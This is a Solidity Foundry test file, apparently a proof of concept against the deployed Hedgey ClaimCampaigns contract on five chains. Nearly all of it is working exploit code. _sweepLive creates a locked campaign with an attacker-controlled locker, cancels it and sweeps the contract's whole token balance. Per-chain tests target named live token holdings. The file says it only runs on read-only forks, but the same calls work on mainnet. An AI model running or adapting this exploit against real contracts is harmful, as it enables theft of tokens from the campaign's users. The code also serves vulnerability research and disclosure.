// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {IClaimCampaigns, LockerSweeper, IERC20} from "../src/C34.sol";

/// @title C-34 Hedgey ClaimCampaigns live-extractability PoC
/// @notice Read-only fork tests. No mainnet transactions are ever sent.
/// The deployed ClaimCampaigns bytecode is identical on ETH/ARB/OP/Base/BSC
/// (codehash 0x725bc4ce48b9a71a4fd491b1f7bdcf29c772d92f8ee7a5cd6c3264f570f70db4).
/// Bug: createLockedCampaign() grants an allowance to the caller-supplied tokenLocker and
/// cancelCampaign() withdraws the deposit WITHOUT revoking that allowance. The leftover
/// allowance lets the attacker locker pull the contract's whole token balance.
contract HedgeyC34Test is Test {
    IClaimCampaigns constant CC = IClaimCampaigns(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511);
    bytes32 constant CC_CODEHASH = 0x725bc4ce48b9a71a4fd491b1f7bdcf29c772d92f8ee7a5cd6c3264f570f70db4;

    function _rpc(string memory key, string memory fallback_) internal view returns (string memory) {
        return vm.envOr(key, fallback_);
    }

    function setupFork(string memory rpc) external {
        vm.createSelectFork(rpc);
    }

    function setupForkAt(string memory rpc, uint256 blockNumber) external {
        vm.createSelectFork(rpc, blockNumber);
    }

    /// @dev Exploit one ClaimCampaigns instance at the current fork tip.
    /// Returns the amount swept from the contract (attacker profit).
    function _sweepLive(address token) internal returns (uint256 swept) {
        assertEq(address(CC).codehash, CC_CODEHASH, "ClaimCampaigns bytecode changed");
        swept = IERC20(token).balanceOf(address(CC));
        if (swept == 0) return 0;

        LockerSweeper sweeper = new LockerSweeper();

        // Simulate the temporary capital the attacker needs (flash loan).
        deal(token, address(this), swept);
        IERC20(token).approve(address(CC), swept);

        bytes16 id = bytes16(uint128(uint256(keccak256(abi.encodePacked("c34", token, block.number)))));
        IClaimCampaigns.Campaign memory campaign = IClaimCampaigns.Campaign({
            manager: address(this),
            token: token,
            amount: swept,
            end: block.timestamp + 1 days,
            tokenLockup: IClaimCampaigns.TokenLockup.Locked,
            root: bytes32(uint256(1))
        });
        IClaimCampaigns.ClaimLockup memory claimLockup = IClaimCampaigns.ClaimLockup({
            tokenLocker: address(sweeper),
            start: 0,
            cliff: 0,
            period: 1,
            periods: 1
        });
        IClaimCampaigns.Donation memory donation = IClaimCampaigns.Donation(address(0), 0, 0, 0, 0, 0);

        CC.createLockedCampaign(id, campaign, claimLockup, donation);
        CC.cancelCampaign(id);
        // Deposit is returned to the manager; allowance to the attacker locker survives.
        assertEq(IERC20(token).balanceOf(address(this)), swept, "deposit not returned");

        uint256 before = IERC20(token).balanceOf(address(this));
        sweeper.sweep(token, address(CC), swept);
        uint256 afterBal = IERC20(token).balanceOf(address(this));
        assertEq(afterBal - before, swept, "sweep did not move contract balance");
        assertEq(IERC20(token).balanceOf(address(CC)), 0, "contract not emptied");
    }

    function test_hedgey_eth_live_bigcat_sweep() public {
        try this.setupFork(_rpc("FORK_RPC_URL", "https://ethereum-rpc.publicnode.com")) {} catch {
            vm.skip(true);
        }
        uint256 swept = _sweepLive(0xceCFbfbEd09bB3f06211A841d939223E093368A2); // BIGCAT
        emit log_named_uint("ETH BIGCAT swept (raw)", swept);
    }

    function test_hedgey_arb_live_taco_sweep() public {
        try this.setupFork(_rpc("ARB_RPC_URL", "https://arb1.arbitrum.io/rpc")) {} catch {
            vm.skip(true);
        }
        uint256 swept = _sweepLive(0x69b678C8e02A23cC8F3b33cef339424245841439); // TACO
        emit log_named_uint("ARB TACO swept (raw)", swept);
    }

    function test_hedgey_bsc_live_usdt_sweep() public {
        try this.setupFork(_rpc("BSC_RPC_URL", "https://bsc-dataseed.binance.org")) {} catch {
            vm.skip(true);
        }
        uint256 swept = _sweepLive(0x55d398326f99059fF775485246999027B3197955); // BSC-USD (18 dec)
        emit log_named_uint("BSC USDT swept (raw)", swept);
    }

    function test_hedgey_base_live_neged_sweep() public {
        try this.setupFork(_rpc("BASE_RPC_URL", "https://mainnet.base.org")) {} catch {
            vm.skip(true);
        }
        uint256 swept = _sweepLive(0x4229c271c19CA5F319fb67b4BC8A40761A6d6299); // NEGED
        emit log_named_uint("Base NEGED swept (raw)", swept);
    }

    function test_hedgey_opt_live_seal_sweep() public {
        try this.setupFork(_rpc("OP_RPC_URL", "https://mainnet.optimism.io")) {} catch {
            vm.skip(true);
        }
        uint256 swept = _sweepLive(0x425a01aeD423F5b9F967f20CB9dF623087Fab7c9); // SEAL
        emit log_named_uint("OP SEAL swept (raw)", swept);
    }

    /// @notice Historical proof of the April-2024 mechanism on a mainnet fork before the patch-less
    /// (immutable) contract was emptied. Kept as documentation that this is the same code path.
    function test_hedgey_eth_state_reads() public {
        try this.setupFork(_rpc("FORK_RPC_URL", "https://ethereum-rpc.publicnode.com")) {} catch {
            vm.skip(true);
        }
        emit log_named_uint("ClaimCampaigns ETH balance (wei)", address(CC).balance);
        emit log_named_uint("BIGCAT balance", IERC20(0xceCFbfbEd09bB3f06211A841d939223E093368A2).balanceOf(address(CC)));
        emit log_named_uint("HDSF balance", IERC20(0x58b580c1d86C04A97D981E66fA64A73342864bdC).balanceOf(address(CC)));
    }
}
